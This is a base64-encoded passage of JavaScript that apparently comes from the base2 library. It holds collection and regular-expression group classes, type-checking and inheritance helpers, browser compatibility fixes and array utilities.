A0KaW5kZXhPZjogZnVuY3Rpb24oYSkgew0KcmV0dXJuIHRoaXNbXzBdLmluZGV4T2YoU3RyaW5nKGEpKQ0KfSwNCmluc2VydEF0OiBmdW5jdGlvbihhLCBiLCBjKSB7DQphc3NlcnQodGhpc1tfMF0uaXRlbShhKSAhPT0gdW5kZWZpbmVkLCAiSW5kZXggb3V0IG9mIGJvdW5kcy4iKTsNCmFzc2VydCghdGhpcy5oYXMoYiksICJEdXBsaWNhdGUga2V5ICciICsgYiArICInLiIpOw0KdGhpc1tfMF0uaW5zZXJ0QXQoYSwgU3RyaW5nKGIpKTsNCnRoaXNbXzEgKyBiXSA9IG51bGw7DQp0aGlzLnB1dC5hcHBseSh0aGlzLCBfMi5jYWxsKGFyZ3VtZW50cywgMSkpDQp9LA0KaXRlbTogZnVuY3Rpb24oYSkgew0KcmV0dXJuIHRoaXNbdHlwZW9mIGEgPT0gIm51bWJlciIgPyAiZ2V0QXQiOiAiZ2V0Il0oYSkNCn0sDQpwdXQ6IGZ1bmN0aW9uKGEsIGIpIHsNCmlmICghdGhpcy5oYXMoYSkpIHsNCnRoaXNbXzBdLnB1c2goU3RyaW5nKGEpKQ0KfQ0KdmFyIGMgPSB0aGlzLmNvbnN0cnVjdG9yOw0KaWYgKGMuSXRlbSAmJiAhaW5zdGFuY2VPZihiLCBjLkl0ZW0pKSB7DQpiID0gYy5jcmVhdGUuYXBwbHkoYywgYXJndW1lbnRzKQ0KfQ0KdGhpc1tfMSArIGFdID0gYg0KfSwNCnB1dEF0OiBmdW5jdGlvbihhLCBiKSB7DQphcmd1bWVudHNbMF0gPSB0aGlzW18wXS5pdGVtKGEpOw0KYXNzZXJ0KGFyZ3VtZW50c1swXSAhPT0gdW5kZWZpbmVkLCAiSW5kZXggb3V0IG9mIGJvdW5kcy4iKTsNCnRoaXMucHV0LmFwcGx5KHRoaXMsIGFyZ3VtZW50cykNCn0sDQpyZW1vdmU6IGZ1bmN0aW9uKGEpIHsNCmlmICh0aGlzLmhhcyhhKSkgew0KdGhpc1tfMF0ucmVtb3ZlKFN0cmluZyhhKSk7DQpkZWxldGUgdGhpc1tfMSArIGFdDQp9DQp9LA0KcmVtb3ZlQXQ6IGZ1bmN0aW9uKGEpIHsNCnZhciBiID0gdGhpc1tfMF0uaXRlbShhKTsNCmlmIChiICE9PSB1bmRlZmluZWQpIHsNCnRoaXNbXzBdLnJlbW92ZUF0KGEpOw0KZGVsZXRlIHRoaXNbXzEgKyBiXQ0KfQ0KfSwNCnJldmVyc2U6IGZ1bmN0aW9uKCkgew0KdGhpc1tfMF0ucmV2ZXJzZSgpOw0KcmV0dXJuIHRoaXMNCn0sDQpzaXplOiBmdW5jdGlvbigpIHsNCnJldHVybiB0aGlzW18wXS5sZW5ndGgNCn0sDQpzbGljZTogZnVuY3Rpb24oYSwgYikgew0KdmFyIGMgPSB0aGlzLmNvcHkoKTsNCmlmIChhcmd1bWVudHMubGVuZ3RoID4gMCkgew0KdmFyIGUgPSB0aGlzW18wXSwNCmQgPSBlOw0KY1tfMF0gPSBBcnJheTIoXzIuYXBwbHkoZSwgYXJndW1lbnRzKSk7DQppZiAoY1tfMF0ubGVuZ3RoKSB7DQpkID0gZC5zbGljZSgwLCBhKTsNCmlmIChhcmd1bWVudHMubGVuZ3RoID4gMSkgew0KZCA9IGQuY29uY2F0KGUuc2xpY2UoYikpDQp9DQp9DQpmb3IgKHZhciBmID0gMDsgZiA8IGQubGVuZ3RoOyBmKyspIHsNCmRlbGV0ZSBjW18xICsgZFtmXV0NCn0NCn0NCnJldHVybiBjDQp9LA0Kc29ydDogZnVuY3Rpb24oYykgew0KaWYgKGMpIHsNCnRoaXNbXzBdLnNvcnQoYmluZChmdW5jdGlvbihhLCBiKSB7DQpyZXR1cm4gYyh0aGlzW18xICsgYV0sIHRoaXNbXzEgKyBiXSwgYSwgYikNCn0sDQp0aGlzKSkNCn0gZWxzZSB0aGlzW18wXS5zb3J0KCk7DQpyZXR1cm4gdGhpcw0KfSwNCnRvU3RyaW5nOiBmdW5jdGlvbigpIHsNCnJldHVybiAiKCIgKyAodGhpc1tfMF0gfHwgIiIpICsgIikiDQp9DQp9LA0Kew0KSXRlbTogbnVsbCwNCmNyZWF0ZTogZnVuY3Rpb24oYSwgYikgew0KcmV0dXJuIHRoaXMuSXRlbSA/IG5ldyB0aGlzLkl0ZW0oYSwgYikgOiBiDQp9LA0KZXh0ZW5kOiBmdW5jdGlvbihhLCBiKSB7DQp2YXIgYyA9IHRoaXMuYmFzZShhKTsNCmMuY3JlYXRlID0gdGhpcy5jcmVhdGU7DQppZiAoYikgZXh0ZW5kKGMsIGIpOw0KaWYgKCFjLkl0ZW0pIHsNCmMuSXRlbSA9IHRoaXMuSXRlbQ0KfSBlbHNlIGlmICh0eXBlb2YgYy5JdGVtICE9ICJmdW5jdGlvbiIpIHsNCmMuSXRlbSA9ICh0aGlzLkl0ZW0gfHwgQmFzZSkuZXh0ZW5kKGMuSXRlbSkNCn0NCmlmIChjLmluaXQpIGMuaW5pdCgpOw0KcmV0dXJuIGMNCn0NCn0pOw0KdmFyIF9wID0gL1xcKFxkKykvZywNCl9xID0gL1xcLi9nLA0KX3IgPSAvXChcP1s6PSFdfFxbW15cXV0rXF0vZywNCl9zID0gL1woL2csDQpfdCA9IC9cJChcZCspLywNCl91ID0gL15cJFxkKyQvOw0KdmFyIFJlZ0dycCA9IENvbGxlY3Rpb24uZXh0ZW5kKHsNCmNvbnN0cnVjdG9yOiBmdW5jdGlvbihhLCBiKSB7DQp0aGlzLmJhc2UoYSk7DQp0aGlzLmlnbm9yZUNhc2UgPSAhIWINCn0sDQppZ25vcmVDYXNlOiBmYWxzZSwNCmV4ZWM6IGZ1bmN0aW9uKGcsIGkpIHsNCmcgKz0gIiI7DQp2YXIgaCA9IHRoaXMsDQpqID0gdGhpc1tfMF07DQppZiAoIWoubGVuZ3RoKSByZXR1cm4gZzsNCmlmIChpID09IFJlZ0dycC5JR05PUkUpIGkgPSAwOw0KcmV0dXJuIGcucmVwbGFjZShuZXcgUmVnRXhwKHRoaXMsIHRoaXMuaWdub3JlQ2FzZSA/ICJnaSI6ICJnIiksDQpmdW5jdGlvbihhKSB7DQp2YXIgYiwgYyA9IDEsDQplID0gMDsNCndoaWxlICgoYiA9IGhbXzEgKyBqW2UrK11dKSkgew0KdmFyIGQgPSBjICsgYi5sZW5ndGggKyAxOw0KaWYgKGFyZ3VtZW50c1tjXSkgew0KdmFyIGYgPSBpID09IG51bGwgPyBiLnJlcGxhY2VtZW50OiBpOw0Kc3dpdGNoICh0eXBlb2YgZikgew0KY2FzZSAiZnVuY3Rpb24iOg0KcmV0dXJuIGYuYXBwbHkoaCwgXzIuY2FsbChhcmd1bWVudHMsIGMsIGQpKTsNCmNhc2UgIm51bWJlciI6DQpyZXR1cm4gYXJndW1lbnRzW2MgKyBmXTsNCmRlZmF1bHQ6DQpyZXR1cm4gZg0KfQ0KfQ0KYyA9IGQNCn0NCnJldHVybiBhDQp9KQ0KfSwNCmluc2VydEF0OiBmdW5jdGlvbihhLCBiLCBjKSB7DQppZiAoaW5zdGFuY2VPZihiLCBSZWdFeHApKSB7DQphcmd1bWVudHNbMV0gPSBiLnNvdXJjZQ0KfQ0KcmV0dXJuIGJhc2UodGhpcywgYXJndW1lbnRzKQ0KfSwNCnRlc3Q6IGZ1bmN0aW9uKGEpIHsNCnJldHVybiB0aGlzLmV4ZWMoYSkgIT0gYQ0KfSwNCnRvU3RyaW5nOiBmdW5jdGlvbigpIHsNCnZhciBkID0gMTsNCnJldHVybiAiKCIgKyB0aGlzLm1hcChmdW5jdGlvbihjKSB7DQp2YXIgZSA9IChjICsgIiIpLnJlcGxhY2UoX3AsDQpmdW5jdGlvbihhLCBiKSB7DQpyZXR1cm4gIlxcIiArIChkICsgTnVtYmVyKGIpKQ0KfSk7DQpkICs9IGMubGVuZ3RoICsgMTsNCnJldHVybiBlDQp9KS5qb2luKCIpfCgiKSArICIpIg0KfQ0KfSwNCnsNCklHTk9SRTogIiQwIiwNCmluaXQ6IGZ1bmN0aW9uKCkgew0KZm9yRWFjaCgiYWRkLGdldCxoYXMscHV0LHJlbW92ZSIuc3BsaXQoIiwiKSwNCmZ1bmN0aW9uKGIpIHsNCl84KHRoaXMsIGIsDQpmdW5jdGlvbihhKSB7DQppZiAoaW5zdGFuY2VPZihhLCBSZWdFeHApKSB7DQphcmd1bWVudHNbMF0gPSBhLnNvdXJjZQ0KfQ0KcmV0dXJuIGJhc2UodGhpcywgYXJndW1lbnRzKQ0KfSkNCn0sDQp0aGlzLnByb3RvdHlwZSkNCn0sDQpJdGVtOiB7DQpjb25zdHJ1Y3RvcjogZnVuY3Rpb24oYSwgYikgew0KaWYgKGIgPT0gbnVsbCkgYiA9IFJlZ0dycC5JR05PUkU7DQplbHNlIGlmIChiLnJlcGxhY2VtZW50ICE9IG51bGwpIGIgPSBiLnJlcGxhY2VtZW50Ow0KZWxzZSBpZiAodHlwZW9mIGIgIT0gImZ1bmN0aW9uIikgYiA9IFN0cmluZyhiKTsNCmlmICh0eXBlb2YgYiA9PSAic3RyaW5nIiAmJiBfdC50ZXN0KGIpKSB7DQppZiAoX3UudGVzdChiKSkgew0KYiA9IHBhcnNlSW50KGIuc2xpY2UoMSkpDQp9IGVsc2Ugew0KdmFyIGMgPSAnIic7DQpiID0gYi5yZXBsYWNlKC9cXC9nLCAiXFxcXCIpLnJlcGxhY2UoLyIvZywgIlxceDIyIikucmVwbGFjZSgvXG4vZywgIlxcbiIpLnJlcGxhY2UoL1xyL2csICJcXHIiKS5yZXBsYWNlKC9cJChcZCspL2csIGMgKyAiKyhhcmd1bWVudHNbJDFdfHwiICsgYyArIGMgKyAiKSsiICsgYykucmVwbGFjZSgvKFsnIl0pXDFcKyguKilcK1wxXDEkLywgIiQxIik7DQpiID0gbmV3IEZ1bmN0aW9uKCJyZXR1cm4gIiArIGMgKyBiICsgYykNCn0NCn0NCnRoaXMubGVuZ3RoID0gUmVnR3JwLmNvdW50KGEpOw0KdGhpcy5yZXBsYWNlbWVudCA9IGI7DQp0aGlzLnRvU3RyaW5nID0gSyhhICsgIiIpDQp9LA0KbGVuZ3RoOiAwLA0KcmVwbGFjZW1lbnQ6ICIiDQp9LA0KY291bnQ6IGZ1bmN0aW9uKGEpIHsNCmEgPSAoYSArICIiKS5yZXBsYWNlKF9xLCAiIikucmVwbGFjZShfciwgIiIpOw0KcmV0dXJuIG1hdGNoKGEsIF9zKS5sZW5ndGgNCn0NCn0pOw0KdmFyIGxhbmcgPSB7DQpuYW1lOiAibGFuZyIsDQp2ZXJzaW9uOiBiYXNlMi52ZXJzaW9uLA0KZXhwb3J0czogImFzc2VydCxhc3NlcnRBcml0eSxhc3NlcnRUeXBlLGJhc2UsYmluZCxjb3B5LGV4dGVuZCxmb3JFYWNoLGZvcm1hdCxpbnN0YW5jZU9mLG1hdGNoLHBjb3B5LHJlc2NhcGUsdHJpbSx0eXBlT2YiLA0KbmFtZXNwYWNlOiAiIg0KfTsNCmZ1bmN0aW9uIGFzc2VydChhLCBiLCBjKSB7DQppZiAoIWEpIHsNCnRocm93IG5ldyhjIHx8IEVycm9yKShiIHx8ICJBc3NlcnRpb24gZmFpbGVkLiIpOw0KfQ0KfTsNCmZ1bmN0aW9uIGFzc2VydEFyaXR5KGEsIGIsIGMpIHsNCmlmIChiID09IG51bGwpIGIgPSBhLmNhbGxlZS5sZW5ndGg7DQppZiAoYS5sZW5ndGggPCBiKSB7DQp0aHJvdyBuZXcgU3ludGF4RXJyb3IoYyB8fCAiTm90IGVub3VnaCBhcmd1bWVudHMuIik7DQp9DQp9Ow0KZnVuY3Rpb24gYXNzZXJ0VHlwZShhLCBiLCBjKSB7DQppZiAoYiAmJiAodHlwZW9mIGIgPT0gImZ1bmN0aW9uIiA/ICFpbnN0YW5jZU9mKGEsIGIpIDogdHlwZU9mKGEpICE9IGIpKSB7DQp0aHJvdyBuZXcgVHlwZUVycm9yKGMgfHwgIkludmFsaWQgdHlwZS4iKTsNCn0NCn07DQpmdW5jdGlvbiBjb3B5KGEpIHsNCnZhciBiID0ge307DQpmb3IgKHZhciBjIGluIGEpIHsNCmJbY10gPSBhW2NdDQp9DQpyZXR1cm4gYg0KfTsNCmZ1bmN0aW9uIHBjb3B5KGEpIHsNCl9kLnByb3RvdHlwZSA9IGE7DQpyZXR1cm4gbmV3IF9kDQp9Ow0KZnVuY3Rpb24gX2QoKSB7fTsNCmZ1bmN0aW9uIGJhc2UoYSwgYikgew0KcmV0dXJuIGEuYmFzZS5hcHBseShhLCBiKQ0KfTsNCmZ1bmN0aW9uIGV4dGVuZChhLCBiKSB7DQppZiAoYSAmJiBiKSB7DQppZiAoYXJndW1lbnRzLmxlbmd0aCA+IDIpIHsNCnZhciBjID0gYjsNCmIgPSB7fTsNCmJbY10gPSBhcmd1bWVudHNbMl0NCn0NCnZhciBlID0gZ2xvYmFsWyh0eXBlb2YgYiA9PSAiZnVuY3Rpb24iID8gIkZ1bmN0aW9uIjogIk9iamVjdCIpXS5wcm90b3R5cGU7DQppZiAoYmFzZTIuX19wcm90b3R5cGluZykgew0KdmFyIGQgPSBfYS5sZW5ndGgsDQpjOw0Kd2hpbGUgKChjID0gX2FbLS1kXSkpIHsNCnZhciBmID0gYltjXTsNCmlmIChmICE9IGVbY10pIHsNCmlmIChfOS50ZXN0KGYpKSB7DQpfOChhLCBjLCBmKQ0KfSBlbHNlIHsNCmFbY10gPSBmDQp9DQp9DQp9DQp9DQpmb3IgKGMgaW4gYikgew0KaWYgKGVbY10gPT09IHVuZGVmaW5lZCkgew0KdmFyIGYgPSBiW2NdOw0KaWYgKGMuY2hhckF0KDApID09ICJAIikgew0KaWYgKGRldGVjdChjLnNsaWNlKDEpKSkgZXh0ZW5kKGEsIGYpDQp9IGVsc2Ugew0KdmFyIGcgPSBhW2NdOw0KaWYgKGcgJiYgdHlwZW9mIGYgPT0gImZ1bmN0aW9uIikgew0KaWYgKGYgIT0gZykgew0KaWYgKF85LnRlc3QoZikpIHsNCl84KGEsIGMsIGYpDQp9IGVsc2Ugew0KZi5hbmNlc3RvciA9IGc7DQphW2NdID0gZg0KfQ0KfQ0KfSBlbHNlIHsNCmFbY10gPSBmDQp9DQp9DQp9DQp9DQp9DQpyZXR1cm4gYQ0KfTsNCmZ1bmN0aW9uIF83KGEsIGIpIHsNCndoaWxlIChiKSB7DQppZiAoIWIuYW5jZXN0b3IpIHJldHVybiBmYWxzZTsNCmIgPSBiLmFuY2VzdG9yOw0KaWYgKGIgPT0gYSkgcmV0dXJuIHRydWUNCn0NCnJldHVybiBmYWxzZQ0KfTsNCmZ1bmN0aW9uIF84KGMsIGUsIGQpIHsNCnZhciBmID0gY1tlXTsNCnZhciBnID0gYmFzZTIuX19wcm90b3R5cGluZzsNCmlmIChnICYmIGYgIT0gZ1tlXSkgZyA9IG51bGw7DQpmdW5jdGlvbiBpKCkgew0KdmFyIGEgPSB0aGlzLmJhc2U7DQp0aGlzLmJhc2UgPSBnID8gZ1tlXSA6IGY7DQp2YXIgYiA9IGQuYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCnRoaXMuYmFzZSA9IGE7DQpyZXR1cm4gYg0KfTsNCmkubWV0aG9kID0gZDsNCmkuYW5jZXN0b3IgPSBmOw0KY1tlXSA9IGkNCn07DQppZiAodHlwZW9mIFN0b3BJdGVyYXRpb24gPT0gInVuZGVmaW5lZCIpIHsNClN0b3BJdGVyYXRpb24gPSBuZXcgRXJyb3IoIlN0b3BJdGVyYXRpb24iKQ0KfQ0KZnVuY3Rpb24gZm9yRWFjaChhLCBiLCBjLCBlKSB7DQppZiAoYSA9PSBudWxsKSByZXR1cm47DQppZiAoIWUpIHsNCmlmICh0eXBlb2YgYSA9PSAiZnVuY3Rpb24iICYmIGEuY2FsbCkgew0KZSA9IEZ1bmN0aW9uDQp9IGVsc2UgaWYgKHR5cGVvZiBhLmZvckVhY2ggPT0gImZ1bmN0aW9uIiAmJiBhLmZvckVhY2ggIT0gYXJndW1lbnRzLmNhbGxlZSkgew0KYS5mb3JFYWNoKGIsIGMpOw0KcmV0dXJuDQp9IGVsc2UgaWYgKHR5cGVvZiBhLmxlbmd0aCA9PSAibnVtYmVyIikgew0KX2UoYSwgYiwgYyk7DQpyZXR1cm4NCn0NCn0NCl81KGUgfHwgT2JqZWN0LCBhLCBiLCBjKQ0KfTsNCmZvckVhY2guY3N2ID0gZnVuY3Rpb24oYSwgYiwgYykgew0KZm9yRWFjaChjc3YoYSksIGIsIGMpDQp9Ow0KZm9yRWFjaC5kZXRlY3QgPSBmdW5jdGlvbihjLCBlLCBkKSB7DQpmb3JFYWNoKGMsDQpmdW5jdGlvbihhLCBiKSB7DQppZiAoYi5jaGFyQXQoMCkgPT0gIkAiKSB7DQppZiAoZGV0ZWN0KGIuc2xpY2UoMSkpKSBmb3JFYWNoKGEsIGFyZ3VtZW50cy5jYWxsZWUpDQp9IGVsc2UgZS5jYWxsKGQsIGEsIGIsIGMpDQp9KQ0KfTsNCmZ1bmN0aW9uIF9lKGEsIGIsIGMpIHsNCmlmIChhID09IG51bGwpIGEgPSBnbG9iYWw7DQp2YXIgZSA9IGEubGVuZ3RoIHx8IDAsDQpkOw0KaWYgKHR5cGVvZiBhID09ICJzdHJpbmciKSB7DQpmb3IgKGQgPSAwOyBkIDwgZTsgZCsrKSB7DQpiLmNhbGwoYywgYS5jaGFyQXQoZCksIGQsIGEpDQp9DQp9IGVsc2Ugew0KZm9yIChkID0gMDsgZCA8IGU7IGQrKykgew0KLypAY2Nfb24gQCovDQovKkBpZihAX2pzY3JpcHRfdmVyc2lvbjw1LjIpaWYoJExlZ2FjeS5oYXMoYSxkKSlAZWxzZSBAKi8NCmlmIChkIGluIGEpDQovKkBlbmQgQCovDQpiLmNhbGwoYywgYVtkXSwgZCwgYSkNCn0NCn0NCg0KfTsNCmZ1bmN0aW9uIF81KGcsIGksIGgsIGopIHsNCnZhciBrID0gZnVuY3Rpb24oKSB7DQp0aGlzLmkgPSAxDQp9Ow0Kay5wcm90b3R5cGUgPSB7DQppOiAxDQp9Ow0KdmFyIGwgPSAwOw0KZm9yICh2YXIgbSBpbiBuZXcgaykgbCsrOw0KXzUgPSAobCA+IDEpID8NCmZ1bmN0aW9uKGEsIGIsIGMsIGUpIHsNCnZhciBkID0ge307DQpmb3IgKHZhciBmIGluIGIpIHsNCmlmICghZFtmXSAmJiBhLnByb3RvdHlwZVtmXSA9PT0gdW5kZWZpbmVkKSB7DQpkW2ZdID0gdHJ1ZTsNCmMuY2FsbChlLCBiW2ZdLCBmLCBiKQ0KfQ0KfQ0KfTogZnVuY3Rpb24oYSwgYiwgYywgZSkgew0KZm9yICh2YXIgZCBpbiBiKSB7DQppZiAoYS5wcm90b3R5cGVbZF0gPT09IHVuZGVmaW5lZCkgew0KYy5jYWxsKGUsIGJbZF0sIGQsIGIpDQp9DQp9DQp9Ow0KXzUoZywgaSwgaCwgaikNCn07DQpmdW5jdGlvbiBpbnN0YW5jZU9mKGEsIGIpIHsNCmlmICh0eXBlb2YgYiAhPSAiZnVuY3Rpb24iKSB7DQp0aHJvdyBuZXcgVHlwZUVycm9yKCJJbnZhbGlkICdpbnN0YW5jZU9mJyBvcGVyYW5kLiIpOw0KfQ0KaWYgKGEgPT0gbnVsbCkgcmV0dXJuIGZhbHNlOw0KLypAY2Nfb24gaWYodHlwZW9mIGEuY29uc3RydWN0b3IhPSJmdW5jdGlvbiIpe3JldHVybiB0eXBlT2YoYSk9PXR5cGVvZiBiLnByb3RvdHlwZS52YWx1ZU9mKCl9QCovDQppZiAoYS5jb25zdHJ1Y3RvciA9PSBiKSByZXR1cm4gdHJ1ZTsNCmlmIChiLmFuY2VzdG9yT2YpIHJldHVybiBiLmFuY2VzdG9yT2YoYS5jb25zdHJ1Y3Rvcik7DQovKkBpZihAX2pzY3JpcHRfdmVyc2lvbjw1LjEpQGVsc2UgQCovDQppZiAoYSBpbnN0YW5jZW9mIGIpIHJldHVybiB0cnVlOw0KLypAZW5kIEAqLw0KaWYgKEJhc2UuYW5jZXN0b3JPZiA9PSBiLmFuY2VzdG9yT2YpIHJldHVybiBmYWxzZTsNCmlmIChCYXNlLmFuY2VzdG9yT2YgPT0gYS5jb25zdHJ1Y3Rvci5hbmNlc3Rvck9mKSByZXR1cm4gYiA9PSBPYmplY3Q7DQpzd2l0Y2ggKGIpIHsNCmNhc2UgQXJyYXk6DQpyZXR1cm4gISEgKHR5cGVvZiBhID09ICJvYmplY3QiICYmIGEuam9pbiAmJiBhLnNwbGljZSk7DQpjYXNlIEZ1bmN0aW9uOg0KcmV0dXJuIHR5cGVPZihhKSA9PSAiZnVuY3Rpb24iOw0KY2FzZSBSZWdFeHA6DQpyZXR1cm4gdHlwZW9mIGEuY29uc3RydWN0b3IuJDEgPT0gInN0cmluZyI7DQpjYXNlIERhdGU6DQpyZXR1cm4gISEgYS5nZXRUaW1lem9uZU9mZnNldDsNCmNhc2UgU3RyaW5nOg0KY2FzZSBOdW1iZXI6DQpjYXNlIEJvb2xlYW46DQpyZXR1cm4gdHlwZU9mKGEpID09IHR5cGVvZiBiLnByb3RvdHlwZS52YWx1ZU9mKCk7DQpjYXNlIE9iamVjdDoNCnJldHVybiB0cnVlDQp9DQpyZXR1cm4gZmFsc2UNCn07DQpmdW5jdGlvbiB0eXBlT2YoYSkgew0KdmFyIGIgPSB0eXBlb2YgYTsNCnN3aXRjaCAoYikgew0KY2FzZSAib2JqZWN0IjoNCnJldHVybiBhID09IG51bGwgPyAibnVsbCI6IHR5cGVvZiBhLmNvbnN0cnVjdG9yID09ICJ1bmRlZmluZWQiID8gX2oudGVzdChhKSA/ICJmdW5jdGlvbiI6IGI6IHR5cGVvZiBhLmNvbnN0cnVjdG9yLnByb3RvdHlwZS52YWx1ZU9mKCk7DQpjYXNlICJmdW5jdGlvbiI6DQpyZXR1cm4gdHlwZW9mIGEuY2FsbCA9PSAiZnVuY3Rpb24iID8gYjogIm9iamVjdCI7DQpkZWZhdWx0Og0KcmV0dXJuIGINCn0NCn07DQp2YXIgSmF2YVNjcmlwdCA9IHsNCm5hbWU6ICJKYXZhU2NyaXB0IiwNCnZlcnNpb246IGJhc2UyLnZlcnNpb24sDQpleHBvcnRzOiAiQXJyYXkyLERhdGUyLEZ1bmN0aW9uMixTdHJpbmcyIiwNCm5hbWVzcGFjZTogIiIsDQpiaW5kOiBmdW5jdGlvbihjKSB7DQp2YXIgZSA9IGdsb2JhbDsNCmdsb2JhbCA9IGM7DQpmb3JFYWNoLmNzdih0aGlzLmV4cG9ydHMsDQpmdW5jdGlvbihhKSB7DQp2YXIgYiA9IGEuc2xpY2UoMCwgLTEpOw0KZXh0ZW5kKGNbYl0sIHRoaXNbYV0pOw0KdGhpc1thXShjW2JdLnByb3RvdHlwZSkNCn0sDQp0aGlzKTsNCmdsb2JhbCA9IGU7DQpyZXR1cm4gYw0KfQ0KfTsNCmZ1bmN0aW9uIF82KGIsIGMsIGUsIGQpIHsNCnZhciBmID0gTW9kdWxlLmV4dGVuZCgpOw0KdmFyIGcgPSBmLnRvU3RyaW5nKCkuc2xpY2UoMSwgLTEpOw0KZm9yRWFjaC5jc3YoZSwNCmZ1bmN0aW9uKGEpIHsNCmZbYV0gPSB1bmJpbmQoYi5wcm90b3R5cGVbYV0pOw0KZi5uYW1lc3BhY2UgKz0gZm9ybWF0KCJ2YXIgJTE9JTIuJTE7IiwgYSwgZykNCn0pOw0KZm9yRWFjaChfMi5jYWxsKGFyZ3VtZW50cywgMyksIGYuaW1wbGVtZW50LCBmKTsNCnZhciBpID0gZnVuY3Rpb24oKSB7DQpyZXR1cm4gZih0aGlzLmNvbnN0cnVjdG9yID09IGYgPyBjLmFwcGx5KG51bGwsIGFyZ3VtZW50cykgOiBhcmd1bWVudHNbMF0pDQp9Ow0KaS5wcm90b3R5cGUgPSBmLnByb3RvdHlwZTsNCmZvciAodmFyIGggaW4gZikgew0KaWYgKGggIT0gInByb3RvdHlwZSIgJiYgYltoXSkgew0KZltoXSA9IGJbaF07DQpkZWxldGUgZi5wcm90b3R5cGVbaF0NCn0NCmlbaF0gPSBmW2hdDQp9DQppLmFuY2VzdG9yID0gT2JqZWN0Ow0KZGVsZXRlIGkuZXh0ZW5kOw0KaS5uYW1lc3BhY2UgPSBpLm5hbWVzcGFjZS5yZXBsYWNlKC8odmFyIChcdyspPSlbXiw7XSssKFteXCldKylcKS9nLCAiJDEkMy4kMiIpOw0KcmV0dXJuIGkNCn07DQppZiAoKG5ldyBEYXRlKS5nZXRZZWFyKCkgPiAxOTAwKSB7DQpEYXRlLnByb3RvdHlwZS5nZXRZZWFyID0gZnVuY3Rpb24oKSB7DQpyZXR1cm4gdGhpcy5nZXRGdWxsWWVhcigpIC0gMTkwMA0KfTsNCkRhdGUucHJvdG90eXBlLnNldFllYXIgPSBmdW5jdGlvbihhKSB7DQpyZXR1cm4gdGhpcy5zZXRGdWxsWWVhcihhICsgMTkwMCkNCn0NCn0NCnZhciBfZiA9IG5ldyBEYXRlKERhdGUuVVRDKDIwMDYsIDEsIDIwKSk7DQpfZi5zZXRVVENEYXRlKDE1KTsNCmlmIChfZi5nZXRVVENIb3VycygpICE9IDApIHsNCmZvckVhY2guY3N2KCJGdWxsWWVhcixNb250aCxEYXRlLEhvdXJzLE1pbnV0ZXMsU2Vjb25kcyxNaWxsaXNlY29uZHMiLA0KZnVuY3Rpb24oYikgew0KZXh0ZW5kKERhdGUucHJvdG90eXBlLCAic2V0VVRDIiArIGIsDQpmdW5jdGlvbigpIHsNCnZhciBhID0gYmFzZSh0aGlzLCBhcmd1bWVudHMpOw0KaWYgKGEgPj0gNTc3MjI0MDEwMDApIHsNCmEgLT0gMzYwMDAwMDsNCnRoaXMuc2V0VGltZShhKQ0KfQ0KcmV0dXJuIGENCn0pDQp9KQ0KfQ0KRnVuY3Rpb24ucHJvdG90eXBlLnByb3RvdHlwZSA9IHt9Ow0KaWYgKCIiLnJlcGxhY2UoL14vLCBLKCIkJCIpKSA9PSAiJCIpIHsNCmV4dGVuZChTdHJpbmcucHJvdG90eXBlLCAicmVwbGFjZSIsDQpmdW5jdGlvbihhLCBiKSB7DQppZiAodHlwZW9mIGIgPT0gImZ1bmN0aW9uIikgew0KdmFyIGMgPSBiOw0KYiA9IGZ1bmN0aW9uKCkgew0KcmV0dXJuIFN0cmluZyhjLmFwcGx5KG51bGwsIGFyZ3VtZW50cykpLnNwbGl0KCIkIikuam9pbigiJCQiKQ0KfQ0KfQ0KcmV0dXJuIHRoaXMuYmFzZShhLCBiKQ0KfSkNCn0NCnZhciBBcnJheTIgPSBfNihBcnJheSwgQXJyYXksICJjb25jYXQsam9pbixwb3AscHVzaCxyZXZlcnNlLHNoaWZ0LHNsaWNlLHNvcnQsc3BsaWNlLHVuc2hpZnQiLCBFbnVtZXJhYmxlLCB7DQpjb21iaW5lOiBmdW5jdGlvbihlLCBkKSB7DQppZiAoIWQpIGQgPSBlOw0KcmV0dXJuIEFycmF5Mi5yZWR1Y2UoZSwNCmZ1bmN0aW9uKGEsIGIsIGMpIHsNCmFbYl0gPSBkW2NdOw0KcmV0dXJuIGENCn0sDQp7fSkNCn0sDQpjb250YWluczogZnVuY3Rpb24oYSwgYikgew0KcmV0dXJuIEFycmF5Mi5pbmRleE9mKGEsIGIpICE9IC0xDQp9LA0KY29weTogZnVuY3Rpb24oYSkgew0KdmFyIGIgPSBfMi5jYWxsKGEpOw0KaWYgKCFiLnN3YXApIEFycmF5MihiKTsNCnJldHVybiBiDQp9LA0KZmxhdHRlbjogZnVuY3Rpb24oYykgew0KdmFyIGUgPSAwOw0KcmV0dXJuIEFycmF5Mi5yZWR1Y2UoYywNCmZ1bmN0aW9uKGEsIGIpIHsNCmlmIChBcnJheTIubGlrZShiKSkgew0KQXJyYXkyLnJlZHVjZShiLCBhcmd1bWVudHMuY2FsbGVlLCBhKQ0KfSBlbHNlIHsNCmFbZSsrXSA9IGINCn0NCnJldHVybiBhDQp9LA0KW10pDQp9LA0KZm9yRWFjaDogX2UsDQppbmRleE9mOiBmdW5jdGlvbihhLCBiLCBjKSB7DQp2YXIgZSA9IGEubGVuZ3RoOw0KaWYgKGMgPT0gbnVsbCkgew0KYyA9IDANCn0gZWxzZSBpZiAoYyA8IDApIHsNCmMgPSBNYXRoLm1heCgwLCBlICsgYykNCn0NCmZvciAodmFyIGQgPSBjOyBkIDwgZTsgZCsrKSB7DQppZiAoYVtkXSA9PT0gYikgcmV0dXJuIGQNCn0NCnJldHVybiAtIDENCn0sDQppbnNlcnRBdDogZnVuY3Rpb24oYSwgYiwgYykgew0KQXJyYXkyLnNwbGljZShhLCBiLCAwLCBjKTsNCnJldHVybiBjDQp9LA0KaXRlbTogZnVuY3Rpb24oYSwgYikgew0KaWYgKGIgPCAwKSBiICs9IGEubGVuZ3RoOw0KcmV0dXJuIGFbYl0NCn0sDQpsYXN0SW5kZXhPZjogZnVuY3Rpb24oYSwgYiwgYykgew0KdmFyIGUgPSBhLmxlbmd0aDsNCmlmIChjID09IG51bGwpIHsNCmMgPSBlIC0gMQ0KfSBlbHNlIGlmIChjIDwgMCkgew0KYyA9IE1hdGgubWF4KDAsIGUgKyBjKQ0KfQ0KZm9yICh2YXIgZCA9IGM7IGQgPj0gMDsgZC0tKSB7DQppZiAoYVtkXSA9PT0gYikgcmV0dXJuIGQNCn0NCnJldHVybiAtIDENCn0sDQptYXA6IGZ1bmN0aW9uKGMsIGUsIGQpIHsNCnZhciBmID0gW107DQpBcnJheTIuZm9yRWFjaChjLA0KZnVuY3Rpb24oYSwgYikgew0KZltiXSA